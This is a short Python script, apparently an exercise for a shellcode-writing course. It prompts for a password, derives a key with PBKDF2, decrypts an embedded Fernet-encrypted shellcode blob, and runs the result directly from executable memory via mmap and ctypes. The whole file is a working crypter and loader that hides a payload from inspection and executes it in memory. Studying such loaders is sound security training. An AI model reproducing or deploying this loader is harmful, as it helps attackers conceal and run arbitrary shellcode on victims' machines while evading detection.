########################################
# Filename: Decrypt-Exec.py
# Author  : Andrea Perfetti
# SLAE ID : PA-29059
#:::::::::::::::::::::::::::::::::::::::
# USAGE
# Add the encoded shellcode in the 'encrypted_payload' variable
# then run the script to decode and execute the payload.
########################################

import string
import base64

from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import ctypes, mmap


# Update here the shellcode to be decrypted
encrypted_payload = b'YWDEDABVSO949AKSgAAAAABgc1VDxiLiy8cCEeHM32LlEqhgXpSLXVpJg9diCF068TgzPU4XwQ1QwnurrFSMDpJVNZMumuPASwGEUbNaCNrwz5gLBbMuiVptDSF4bynHpQgzyGl3BVboU0QQgFsVuapqp1sj'


salt = encrypted_payload[:16]
cipher_text = encrypted_payload[16:]

plain_pwd = input("Enter the password: ")

kdf = PBKDF2HMAC(
	algorithm = hashes.SHA256(),
	length = 32,
	salt = salt,
	iterations = 1000,
)
key = base64.urlsafe_b64encode(kdf.derive(plain_pwd.encode()))

cipher_suite = Fernet(key)
shellcode_data = cipher_suite.decrypt(cipher_text)

shellcode = bytes(shellcode_data)
memory_buffer = mmap.mmap(-1,len(shellcode_data), prot = mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC, flags = mmap.MAP_ANONYMOUS | mmap.MAP_PRIVATE)
memory_buffer.write(shellcode_data)
buffer = ctypes.c_int.from_buffer(memory_buffer)

shellcode_function = ctypes.CFUNCTYPE( ctypes.c_int64 )(ctypes.addressof(buffer))
shellcode_function._avoid_gc_for_mmap = memory_buffer

shellcode_function()